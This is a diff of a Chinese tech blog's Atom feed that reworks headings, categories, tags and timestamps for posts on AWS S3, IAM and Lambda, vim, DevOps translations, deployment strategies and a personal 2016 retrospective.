@@ -1154,14 +1288,15 @@ feedback，开放式协作
     
     <summary type="html">
     
-      &lt;p&gt;AWS S3是一个非常厉害的服务，上个月S3宕机4小时，江湖上传出了“半个互联网出现问题”的传言。姑且不谈S3的影响力有多大，在计算单元越来越小且移动存储设备近两年并未降价的趋势下，高可用高伸缩的云存储服务应该成为每一个开发者必备的知识。&lt;br&gt;简单来说S3提供了一些buc
+      &lt;p&gt;AWS S3是一个非常厉害的服务，上个月S3宕机4小时，江湖上传出了“半个互联网出现问题”的传言。姑且不谈S3的影响力有多大，在计算单元越来越小且移动存储设备近两年并未降价的趋势下，高可用高伸缩的云存储服务应该成为每一个开发者必备的知识。&lt;/p&gt;
+&lt;p&gt;简单来说S3提供了一
     
     </summary>
     
+      <category term="Amazon Web Services" scheme="https://www.duyidong.com/categories/Amazon-Web-Services/"/>
+    
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
-    
-      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
     
       <category term="S3" scheme="https://www.duyidong.com/tags/S3/"/>
     
@@ -1174,7 +1309,7 @@ feedback，开放式协作
     <link href="https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/"/>
     <id>https://www.duyidong.com/2017/03/07/Deploy-Hexo-to-S3/</id>
     <published>2017-03-07T09:42:34.000Z</published>
-    <updated>2017-04-12T13:28:01.000Z</updated>
+    <updated>2017-05-04T12:25:18.000Z</updated>
     
     <content type="html"><![CDATA[<p>最近在学习AWS服务，加之两次遇到github.io无法访问的情况，决定将博客迁移到AWS S3上。</p>
 <h2 id="S3介绍"><a href="#S3介绍" class="headerlink" title="S3介绍"></a>S3介绍</h2><p>S3是AWS一个对象存储服务，拥有11个9的耐久度和3个9的可用性（并不算高），属于AWS底层存储服务。同时提供Host静态网站的功能</p>
@@ -1278,10 +1413,10 @@ export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt;
     
     </summary>
     
+      <category term="我的博客" scheme="https://www.duyidong.com/categories/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
+    
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
-    
-      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
     
       <category term="S3" scheme="https://www.duyidong.com/tags/S3/"/>
     
@@ -1296,9 +1431,9 @@ export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt;
     <link href="https://www.duyidong.com/2017/03/06/%E6%B5%85%E8%B0%88AWS-IAM/"/>
     <id>https://www.duyidong.com/2017/03/06/浅谈AWS-IAM/</id>
     <published>2017-03-06T12:41:50.000Z</published>
-    <updated>2017-04-12T13:27:57.000Z</updated>
+    <updated>2017-05-04T12:25:04.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="浅谈-AWS-IAM"><a href="#浅谈-AWS-IAM" class="headerlink" title="浅谈 AWS IAM"></a>浅谈 AWS IAM</h1><p>IAM，全称Identity &amp; Access Management，作用是AWS资源的权限管理。</p>
+    <content type="html"><![CDATA[<p>IAM，全称Identity &amp; Access Management，作用是AWS资源的权限管理。</p>
 <h2 id="IAM解决了什么问题"><a href="#IAM解决了什么问题" class="headerlink" title="IAM解决了什么问题"></a>IAM解决了什么问题</h2><p>解决了什么问题，等同于带来了什么价值，在AWS的<a href="https://aws.amazon.com/iam/details/" target="_blank" rel="external">官方文档</a>中，IAM主要是出于以下需求被设计出来的：</p>
 <ul>
 <li><strong>增强安全：</strong>AWS给每个用户单独的验证，保证每个用户能够被分配恰当的权限，从而保证AWS资源的安全。默认情况下，IAM的User在被创建的时候是没有任何权限的，所以IAM是默认安全的。</li>
@@ -1352,14 +1487,15 @@ export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt;
     
     <summary type="html">
     
-      &lt;h1 id=&quot;浅谈-AWS-IAM&quot;&gt;&lt;a href=&quot;#浅谈-AWS-IAM&quot; class=&quot;headerlink&quot; title=&quot;浅谈 AWS IAM&quot;&gt;&lt;/a&gt;浅谈 AWS IAM&lt;/h1&gt;&lt;p&gt;IAM，全称Identity &amp;amp; Access Management
+      &lt;p&gt;IAM，全称Identity &amp;amp; Access Management，作用是AWS资源的权限管理。&lt;/p&gt;
+&lt;h2 id=&quot;IAM解决了什么问题&quot;&gt;&lt;a href=&quot;#IAM解决了什么问题&quot; class=&quot;headerlink&quot; title=&quot;IAM解决了什么问题&quot;
     
     </summary>
     
+      <category term="Amazon Web Services" scheme="https://www.duyidong.com/categories/Amazon-Web-Services/"/>
+    
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
-    
-      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
     
       <category term="亚马逊认证与权限" scheme="https://www.duyidong.com/tags/%E4%BA%9A%E9%A9%AC%E9%80%8A%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%9D%83%E9%99%90/"/>
     
@@ -1370,13 +1506,14 @@ export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt;
   </entry>
   
   <entry>
-    <title>AWS Services Overview</title>
+    <title>Amazon Web Server 服务概览</title>
     <link href="https://www.duyidong.com/2017/02/28/AWS-Services-Overview/"/>
     <id>https://www.duyidong.com/2017/02/28/AWS-Services-Overview/</id>
     <published>2017-02-28T06:55:01.000Z</published>
-    <updated>2017-04-12T13:21:28.000Z</updated>
+    <updated>2017-05-04T12:24:56.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="Amazon-Web-Server-服务概览"><a href="#Amazon-Web-Server-服务概览" class="headerlink" title="Amazon Web Server 服务概览"></a>Amazon Web Server 服务概览</h1><p>最近在准备AWS助理级架构师认证考试，借此机会梳理一下AWS比较核心的几个服务，不会太深入细节，只做简单阐释。<br>首先关于AWS服务一览：</p>
+    <content type="html"><![CDATA[<p>最近在准备AWS助理级架构师认证考试，借此机会梳理一下AWS比较核心的几个服务，不会太深入细节，只做简单阐释。</p>
+<p>首先关于AWS服务一览：</p>
 <p><img src="/images/AWS_Services_Overview.png" alt=""></p>
 <p>以下服务会出现在助理级架构师考试中：</p>
 <p><img src="/images/AWS_Services_Exam.png" alt=""></p>
@@ -1493,9 +1630,13 @@ export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt;
     
     <summary type="html">
     
-      &lt;h1 id=&quot;Amazon-Web-Server-服务概览&quot;&gt;&lt;a href=&quot;#Amazon-Web-Server-服务概览&quot; class=&quot;headerlink&quot; title=&quot;Amazon Web Server 服务概览&quot;&gt;&lt;/a&gt;Amazon Web Server 服务
+      &lt;p&gt;最近在准备AWS助理级架构师认证考试，借此机会梳理一下AWS比较核心的几个服务，不会太深入细节，只做简单阐释。&lt;/p&gt;
+&lt;p&gt;首先关于AWS服务一览：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/images/AWS_Services_Overview.png&quot; alt=&quot;&quot;&gt;&lt;/
     
     </summary>
+    
+      <category term="Amazon Web Services" scheme="https://www.duyidong.com/categories/Amazon-Web-Services/"/>
     
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
@@ -1509,9 +1650,9 @@ export AWS_SECRET_ACCESS_KEY=&lt;secret key&gt;
     <link href="https://www.duyidong.com/2017/02/24/vim%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%A1/"/>
     <id>https://www.duyidong.com/2017/02/24/vim学习小计/</id>
     <published>2017-02-24T07:41:09.000Z</published>
-    <updated>2017-03-07T10:12:23.000Z</updated>
+    <updated>2017-05-04T12:24:24.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="vim常用命令"><a href="#vim常用命令" class="headerlink" title="vim常用命令"></a>vim常用命令</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>说起来，从接触Linux到现在，使用Vim大概有一年的时间，大部分时候主要在编辑一些配置文件，查看文档使用。算不上vim的高级玩家，在此主要针对vim的一些常见使用场景做一个命令汇总。</p>
+    <content type="html"><![CDATA[<p>说起来，从接触Linux到现在，使用Vim大概有一年的时间，大部分时候主要在编辑一些配置文件，查看文档使用。算不上vim的高级玩家，在此主要针对vim的一些常见使用场景做一个命令汇总。</p>
 <h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><pre><code>vim -On file1 file2 # 左右打开两个文件
 vim -on file1 file2 # 上下打开两个文件
 vim -d file1 file2 # diff
@@ -1542,9 +1683,12 @@ ZQ 不保存退出
     
     <summary type="html">
     
-      &lt;h1 id=&quot;vim常用命令&quot;&gt;&lt;a href=&quot;#vim常用命令&quot; class=&quot;headerlink&quot; title=&quot;vim常用命令&quot;&gt;&lt;/a&gt;vim常用命令&lt;/h1&gt;&lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; titl
+      &lt;p&gt;说起来，从接触Linux到现在，使用Vim大概有一年的时间，大部分时候主要在编辑一些配置文件，查看文档使用。算不上vim的高级玩家，在此主要针对vim的一些常见使用场景做一个命令汇总。&lt;/p&gt;
+&lt;h2 id=&quot;打开文件&quot;&gt;&lt;a href=&quot;#打开文件&quot; class=&quot;hea
     
     </summary>
+    
+      <category term="工具" scheme="https://www.duyidong.com/categories/%E5%B7%A5%E5%85%B7/"/>
     
     
       <category term="vim" scheme="https://www.duyidong.com/tags/vim/"/>
@@ -1558,9 +1702,10 @@ ZQ 不保存退出
     <link href="https://www.duyidong.com/2017/02/23/Lambda%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
     <id>https://www.duyidong.com/2017/02/23/Lambda初体验/</id>
     <published>2017-02-23T10:23:00.000Z</published>
-    <updated>2017-04-12T13:27:48.000Z</updated>
+    <updated>2017-05-04T12:24:01.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="使用Lambda和CloudTrail给新创建的bucket打上tag"><a href="#使用Lambda和CloudTrail给新创建的bucket打上tag" class="headerlink" title="使用Lambda和CloudTrail给新创建的bucket打上tag"></a>使用Lambda和CloudTrail给新创建的bucket打上tag</h1><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><h3 id="什么是Lambda"><a href="#什么是Lambda" class="headerlink" title="什么是Lambda"></a>什么是Lambda</h3><p>AWS Lambda提供了一个不需要服务器就能运行代码的平台，有以下特点：</p>
+    <content type="html"><![CDATA[<p>使用Lambda和CloudTrail给新创建的bucket打上tag</p>
+<h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><h3 id="什么是Lambda"><a href="#什么是Lambda" class="headerlink" title="什么是Lambda"></a>什么是Lambda</h3><p>AWS Lambda提供了一个不需要服务器就能运行代码的平台，有以下特点：</p>
 <ul>
 <li>高伸缩：适用于一天数次的访问频率到一秒数千次的访问量，横向纵向灵活扩展</li>
 <li>按需付费：你只需要根据访问量付费，价格非常便宜（$0.20每百万次访问）</li>
@@ -1657,9 +1802,12 @@ ZQ 不保存退出
     
     <summary type="html">
     
-      &lt;h1 id=&quot;使用Lambda和CloudTrail给新创建的bucket打上tag&quot;&gt;&lt;a href=&quot;#使用Lambda和CloudTrail给新创建的bucket打上tag&quot; class=&quot;headerlink&quot; title=&quot;使用Lambda和CloudTrail给新创
+      &lt;p&gt;使用Lambda和CloudTrail给新创建的bucket打上tag&lt;/p&gt;
+&lt;h2 id=&quot;背景介绍&quot;&gt;&lt;a href=&quot;#背景介绍&quot; class=&quot;headerlink&quot; title=&quot;背景介绍&quot;&gt;&lt;/a&gt;背景介绍&lt;/h2&gt;&lt;h3 id=&quot;什么是Lambda&quot;&gt;&lt;a 
     
     </summary>
+    
+      <category term="Amazon Web Services" scheme="https://www.duyidong.com/categories/Amazon-Web-Services/"/>
     
     
       <category term="AWS" scheme="https://www.duyidong.com/tags/AWS/"/>
@@ -1668,18 +1816,18 @@ ZQ 不保存退出
     
       <category term="无服务器架构" scheme="https://www.duyidong.com/tags/%E6%97%A0%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84/"/>
     
-      <category term="上云" scheme="https://www.duyidong.com/tags/%E4%B8%8A%E4%BA%91/"/>
+      <category term="Lambda" scheme="https://www.duyidong.com/tags/Lambda/"/>
     
   </entry>
   
   <entry>
-    <title>2016大事记</title>
+    <title>2016 野蛮生长的一年</title>
     <link href="https://www.duyidong.com/2017/01/16/2016%E5%A4%A7%E4%BA%8B%E8%AE%B0/"/>
     <id>https://www.duyidong.com/2017/01/16/2016大事记/</id>
     <published>2017-01-16T08:35:41.000Z</published>
-    <updated>2017-02-20T12:39:03.000Z</updated>
+    <updated>2017-05-04T12:23:51.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="2016-野蛮生长的一年"><a href="#2016-野蛮生长的一年" class="headerlink" title="2016 野蛮生长的一年"></a>2016 野蛮生长的一年</h1><h2 id="15年的尾声"><a href="#15年的尾声" class="headerlink" title="15年的尾声"></a>15年的尾声</h2><p>15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？<br><a id="more"></a></p>
+    <content type="html"><![CDATA[<h2 id="15年的尾声"><a href="#15年的尾声" class="headerlink" title="15年的尾声"></a>15年的尾声</h2><p>15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？<br><a id="more"></a></p>
 <h2 id="成为一枚程序员"><a href="#成为一枚程序员" class="headerlink" title="成为一枚程序员"></a>成为一枚程序员</h2><p>之前的工作只是在码代码，对于代码的意义，如何成为一个网站，以及网站如何发挥它的价值是一无所知的，好在coding的内容都比较有趣，一边发掘着网络世界的神奇，一边学习养家糊口的本事。<br>从一开始的爬虫，到社工库，到端口扫描，对网络世界的认识逐步提高；从一开始不知道自己在做什么，到后来两周做的网站卖了三十万，到后来觉得技术可以改变世界；我一天天成长着，<br>直到找工作开始，我才算是真正的成为一名程序员，时间大概是在三月份左右，我笨手笨脚的搭建了自己的博客，开始系统回顾大学所学的知识，总结涉足IT行业半年以来的经验，研读一些自己没有遇到过但是别人遇到了的问题，对技术的态度由”讨口饭吃”，穿变成一种兴趣，对曾经不削一顾的计算机，竟然开始心心相惜。</p>
 <h2 id="跳槽"><a href="#跳槽" class="headerlink" title="跳槽"></a>跳槽</h2><p>时间大概是在四月份，我收到一封拉勾网的回复，”ThoughtWorks的HR对你的简历感兴趣“，当时已经拿到软通的offer，薪资不低，且有华为靠山；但比较顾虑软通工作环境不佳，会对个人发展不利；抱着试一试的想法在清明陪爷爷奶奶游玩九寨沟期间给HR发了一封自荐邮件，假期结束后当即收到了Cherry的邮件回复，欢呼雀跃之余感叹这是我理梦想最近的一次。<br>大概在年初的时候我就来过一次软件园，当时在天府五街的地铁站前，感叹这里的办公楼都好大气，因为在北京真的没见过什么正儿八经的写字楼，于是发誓将来一定要在这里上班，加上好友引荐，早就觉得ThoughtWorks是一家女神一样的公司，宽松的文化，舒适的办公环境，有很多技术大牛，入职居然还配mac电脑，哈哈，当时就这样被这家公司吸引着。后来大概花了两周时间一边上班一遍翻完了大学四年的教材，在网上看了很多python的博客，提交homework， homework过了，通知到公司面试，逻辑测试, pair, 有种不过如此的感觉，不过还是认真对待，最终拿到offer，已经是五月了。</p>
 <h2 id="复合"><a href="#复合" class="headerlink" title="复合"></a>复合</h2><p>拿到TW的offer之后果断拒绝了软通，也不再想面其他公司了，安心租房，过了一段自由自在的日子。<br>入职TW前期压力是比较大的，比找工作时更大强度的学习任务，更high-level的认知模型，在TW的最初两个月一度认为自己原来对软件开发一无所知，在此期间很感谢我的buddy给我的指引，还有好玩的同事们的帮助，海外项目组很轻松，又有很多高智商的人一起工作，没有以前公司经常可见的那种眼神呆滞的人，这样的环境让我觉得很舒服，成长也很快，在做过几次session，准备一段时间AWS认证考试无果之后，终于roll off了</p>
@@ -1697,9 +1845,11 @@ ZQ 不保存退出
     
     <summary type="html">
     
-      &lt;h1 id=&quot;2016-野蛮生长的一年&quot;&gt;&lt;a href=&quot;#2016-野蛮生长的一年&quot; class=&quot;headerlink&quot; title=&quot;2016 野蛮生长的一年&quot;&gt;&lt;/a&gt;2016 野蛮生长的一年&lt;/h1&gt;&lt;h2 id=&quot;15年的尾声&quot;&gt;&lt;a href=&quot;#15年的尾声&quot; class=&quot;headerlink&quot; title=&quot;15年的尾声&quot;&gt;&lt;/a&gt;15年的尾声&lt;/h2&gt;&lt;p&gt;15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？&lt;br&gt;
+      &lt;h2 id=&quot;15年的尾声&quot;&gt;&lt;a href=&quot;#15年的尾声&quot; class=&quot;headerlink&quot; title=&quot;15年的尾声&quot;&gt;&lt;/a&gt;15年的尾声&lt;/h2&gt;&lt;p&gt;15年经历了北京的痛不欲生回到成都，辗转踌躇，终于找到一份工作进入IT行业，算起来迄今不过只度过了短短一年，比起影视行业摸爬滚打的2年时光，还要短些，我已俨然一副程序员模样，享受着室内舒适的工作环境，稳定的收入，付出着擅长的脑力劳动，有时候会想，不是我选择了工作，是工作选择了我；有时候也会想，会不会有一天，我又不做程序员了，什么会让我生存下去？&lt;br&gt;
     
     </summary>
+    
+      <category term="学习总结" scheme="https://www.duyidong.com/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
     
     
       <category term="大事记" scheme="https://www.duyidong.com/tags/%E5%A4%A7%E4%BA%8B%E8%AE%B0/"/>
@@ -1711,17 +1861,21 @@ ZQ 不保存退出
     <link href="https://www.duyidong.com/2016/11/11/%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%BB%8B%E7%BB%8DDevOps%E6%98%AF%E5%81%9A%E4%BB%80%E4%B9%88%E7%9A%84/"/>
     <id>https://www.duyidong.com/2016/11/11/一句话介绍DevOps是做什么的/</id>
     <published>2016-11-11T01:42:58.000Z</published>
-    <updated>2017-04-18T09:40:45.000Z</updated>
+    <updated>2017-05-04T12:30:06.000Z</updated>
     
-    <content type="html"><![CDATA[<p>DevOps是一个很广泛的概念，他是一个运动，一种文化，强调团队紧密合作，以快速反馈的手段达到团队目标为交付最终价值的效果。<br>DevOps延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等。<br>每一种实践落实到行动上就要使用一些工具，比如基础设施及代码我们会引入很多配置管理工具，比如Ansible,puppet,chef,salt。可视化这一块可能会涉及到一些PaaS平台，比如AWS，Rancher等等。持续集成持续部署这一块主要就是一些CI 工具，Jenkins，GOCD，等等。</p>
+    <content type="html"><![CDATA[<p>DevOps是一个很广泛的概念，他是一个运动，一种文化，强调团队紧密合作，以快速反馈的手段达到团队目标为交付最终价值的效果。</p>
+<p>DevOps延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等。<br>每一种实践落实到行动上就要使用一些工具，比如基础设施及代码我们会引入很多配置管理工具，比如Ansible,puppet,chef,salt。可视化这一块可能会涉及到一些PaaS平台，比如AWS，Rancher等等。持续集成持续部署这一块主要就是一些CI 工具，Jenkins，GOCD，等等。</p>
 <h2 id="第二版"><a href="#第二版" class="headerlink" title="第二版"></a>第二版</h2><p>DevOps承袭自敏捷系统管理，是一种重视软件开发人员与IT运维人员之间沟通合作的技术运动。近年来，随着云计算、虚拟化等技术的迅猛发展及敏捷实践在业内的普及，质量内建、基础设施即代码、部署流水线、服务监控与健康检查、分布式问题定位及追踪等诸多DevOps实践也在各大公司IT项目中得到探索和应用。开发、测试、运维团队之间的协作性得到提高，生产环境的发布风险明显降低，缩短了持续交付的迭代周期，从而提升了组织效率，对业务连续性也起到了积极作用。因此，DevOps运动获得了越来越多从业者的认可。</p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;DevOps是一个很广泛的概念，他是一个运动，一种文化，强调团队紧密合作，以快速反馈的手段达到团队目标为交付最终价值的效果。&lt;br&gt;DevOps延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等。&lt;br&gt;每一种实践落实到行动
+      &lt;p&gt;DevOps是一个很广泛的概念，他是一个运动，一种文化，强调团队紧密合作，以快速反馈的手段达到团队目标为交付最终价值的效果。&lt;/p&gt;
+&lt;p&gt;DevOps延伸而来有很多实践，包括：基础设施即代码，监控可视化，自动化测试，持续集成持续部署，集成配置管理等等。&lt;br&gt;每一种实践落
     
     </summary>
+    
+      <category term="DevOps" scheme="https://www.duyidong.com/categories/DevOps/"/>
     
     
       <category term="DevOps" scheme="https://www.duyidong.com/tags/DevOps/"/>
@@ -1733,9 +1887,9 @@ ZQ 不保存退出
     <link href="https://www.duyidong.com/2016/11/04/%E7%BF%BB%E8%AF%91-%E9%9B%AA%E8%8A%B1%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
     <id>https://www.duyidong.com/2016/11/04/翻译-雪花服务器/</id>
     <published>2016-11-04T07:29:52.000Z</published>
-    <updated>2017-04-12T13:34:03.000Z</updated>
+    <updated>2017-05-04T12:32:45.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="雪花服务器"><a href="#雪花服务器" class="headerlink" title="雪花服务器"></a>雪花服务器</h1><p>原文链接: <a href="http://martinfowler.com/bliki/SnowflakeServer.html" target="_blank" rel="external">http://martinfowler.com/bliki/SnowflakeServer.html</a></p>
+    <content type="html"><![CDATA[<p>原文链接: <a href="http://martinfowler.com/bliki/SnowflakeServer.html" target="_blank" rel="external">http://martinfowler.com/bliki/SnowflakeServer.html</a></p>
 <p>保持生产环境服务器正常运行可能是一件非常繁琐的事，你必须保证你的操作系统和应用运行的环境被及时的修补以确保是最新版本。被托管的应用需要被经常升级。应用所处的环境也需要实时调整来配合应用有效运行即与其他系统正常通信。这些操作都依赖于命令行，GUI，或者编辑配置文件。<br><a id="more"></a><br>导致的结果就是“雪花服务器” ———— 对数据中心带来不好的影响</p>
 <p>雪花服务器的第一个问题就是很难被复制。如果你的服务器硬件有问题，这就意味着你很难启动另一个服务器来提供相同的服务。如果你需要一个集群，你不能保证你启动的所有instance都是同步的。你不能复制一个产品环境来测试。当你的产品环境挂了，你将无法在你的开发测试环境重现这个错误。</p>
 <p>给你的雪花服务器创建镜像或许是一个解决方案，但是镜像往往会打包很多你不需要的配置，更别说错误也会被一同打包。</p>
@@ -1748,10 +1902,12 @@ ZQ 不保存退出
     
     <summary type="html">
     
-      &lt;h1 id=&quot;雪花服务器&quot;&gt;&lt;a href=&quot;#雪花服务器&quot; class=&quot;headerlink&quot; title=&quot;雪花服务器&quot;&gt;&lt;/a&gt;雪花服务器&lt;/h1&gt;&lt;p&gt;原文链接: &lt;a href=&quot;http://martinfowler.com/bliki/SnowflakeServer.html&quot;&gt;http://martinfowler.com/bliki/SnowflakeServer.html&lt;/a&gt;&lt;/p&gt;
+      &lt;p&gt;原文链接: &lt;a href=&quot;http://martinfowler.com/bliki/SnowflakeServer.html&quot;&gt;http://martinfowler.com/bliki/SnowflakeServer.html&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;保持生产环境服务器正常运行可能是一件非常繁琐的事，你必须保证你的操作系统和应用运行的环境被及时的修补以确保是最新版本。被托管的应用需要被经常升级。应用所处的环境也需要实时调整来配合应用有效运行即与其他系统正常通信。这些操作都依赖于命令行，GUI，或者编辑配置文件。&lt;br&gt;
     
     </summary>
+    
+      <category term="DevOps" scheme="https://www.duyidong.com/categories/DevOps/"/>
     
     
       <category term="翻译" scheme="https://www.duyidong.com/tags/%E7%BF%BB%E8%AF%91/"/>
@@ -1765,7 +1921,7 @@ ZQ 不保存退出
     <link href="https://www.duyidong.com/2016/11/02/%E7%BF%BB%E8%AF%91-%E5%87%A4%E5%87%B0%E5%BC%8F%E6%9C%8D%E5%8A%A1/"/>
     <id>https://www.duyidong.com/2016/11/02/翻译-凤凰式服务/</id>
     <published>2016-11-02T09:06:13.000Z</published>
-    <updated>2017-04-12T13:34:07.000Z</updated>
+    <updated>2017-05-04T12:32:36.000Z</updated>
     
     <content type="html"><![CDATA[<p>原文链接： <a href="http://martinfowler.com/bliki/PhoenixServer.html" target="_blank" rel="external">http://martinfowler.com/bliki/PhoenixServer.html</a></p>
 <p>有一天我突然幻想一个验证运营的服务，这个服务就是我如果跑去把公司的数据中心关掉，这毫无疑问将至我们公司的产品服务于危机之中，而这个服务的评定标准则是运营图团队需要花费多少时间能让我们的产品应用重新恢复正常。<br><a id="more"></a></p>
@@ -1789,10 +1945,12 @@ ZQ 不保存退出
     
     </summary>
     
+      <category term="DevOps" scheme="https://www.duyidong.com/categories/DevOps/"/>
     
-      <category term="凤凰式服务" scheme="https://www.duyidong.com/tags/%E5%87%A4%E5%87%B0%E5%BC%8F%E6%9C%8D%E5%8A%A1/"/>
     
       <category term="翻译" scheme="https://www.duyidong.com/tags/%E7%BF%BB%E8%AF%91/"/>
+    
+      <category term="凤凰式服务" scheme="https://www.duyidong.com/tags/%E5%87%A4%E5%87%B0%E5%BC%8F%E6%9C%8D%E5%8A%A1/"/>
     
   </entry>
   
@@ -1801,9 +1959,9 @@ ZQ 不保存退出
     <link href="https://www.duyidong.com/2016/10/24/%E9%83%A8%E7%BD%B2%E5%92%8C%E5%8F%91%E5%B8%83%E7%AD%96%E7%95%A5%E7%9A%84%E6%BC%94%E8%BF%9B/"/>
     <id>https://www.duyidong.com/2016/10/24/部署和发布策略的演进/</id>
     <published>2016-10-24T06:30:20.000Z</published>
-    <updated>2017-04-13T05:47:34.000Z</updated>
+    <updated>2017-05-04T12:33:53.000Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="持续交付的目的"><a href="#持续交付的目的" class="headerlink" title="持续交付的目的"></a>持续交付的目的</h1><h2 id="以下问题有没有解决？"><a href="#以下问题有没有解决？" class="headerlink" title="以下问题有没有解决？"></a>以下问题有没有解决？</h2><p>“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？<br>用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；<br>如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；<br>运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？</p>
+    <content type="html"><![CDATA[<h1 id="持续交付的目的"><a href="#持续交付的目的" class="headerlink" title="持续交付的目的"></a>持续交付的目的</h1><p><strong>以下问题有没有解决？</strong><br>“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？<br>用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；<br>如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；<br>运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？</p>
 <a id="more"></a>
 <h1 id="部署和发布的区别"><a href="#部署和发布的区别" class="headerlink" title="部署和发布的区别"></a>部署和发布的区别</h1><p>要弄清楚部署和发布的区别，首先要弄清楚几个名词之间的关系CI(Continues Intergation)持续集成，CD(Continues Delivery)持续交付，持续集成的目的是对代码的快速反馈，在分布式开发的团队中你的更改不会破坏已有代码功能，持续交付的scope要大一些，指的是对用户交付最终价值，传统的交付最终价值即为产生可发布的版本，有的公司在持续交付的基础之上甚至提出了持续部署（Continous Deployment），即自动化讲可发布版本放入到产品环境，其中就涉及到蓝绿部署，滚动部署等部署方式。在部署和发布解耦之后，在将产品部署到产品环境之后我们可能还有些功能是不想对用户可见的，在对用户可见的的这个过程我们称之为发布（Release）（如图）。DevOps运动则是在发布之后有引入运维和运营的角色，和用户反馈一起形成一个闭环。恩，差不多是这个样子的。</p>
 <p><img src="https://puppet.com/sites/default/files/2016-09/puppet_continuous_diagram.gif" alt=""></p>
@@ -1855,14 +2013,16 @@ ZQ 不保存退出
     
     <summary type="html">
     
-      &lt;h1 id=&quot;持续交付的目的&quot;&gt;&lt;a href=&quot;#持续交付的目的&quot; class=&quot;headerlink&quot; title=&quot;持续交付的目的&quot;&gt;&lt;/a&gt;持续交付的目的&lt;/h1&gt;&lt;h2 id=&quot;以下问题有没有解决？&quot;&gt;&lt;a href=&quot;#以下问题有没有解决？&quot; class=&quot;headerlink&quot; title=&quot;以下问题有没有解决？&quot;&gt;&lt;/a&gt;以下问题有没有解决？&lt;/h2&gt;&lt;p&gt;“快速将产品推向市场” 与 “提供稳定、安全并可靠的IT服务” 是否可以兼得？&lt;br&gt;用更少的资源完成更多的业绩，既要保持竞争力，又要削减成本；&lt;br&gt;如何解决任务交接出现的问题，例如业务与开发，开发与运维之间；&lt;br&gt;运维人员能否和其他人一样，正常上下班，而不用在夜里或者周末加班？&lt;/p&gt;
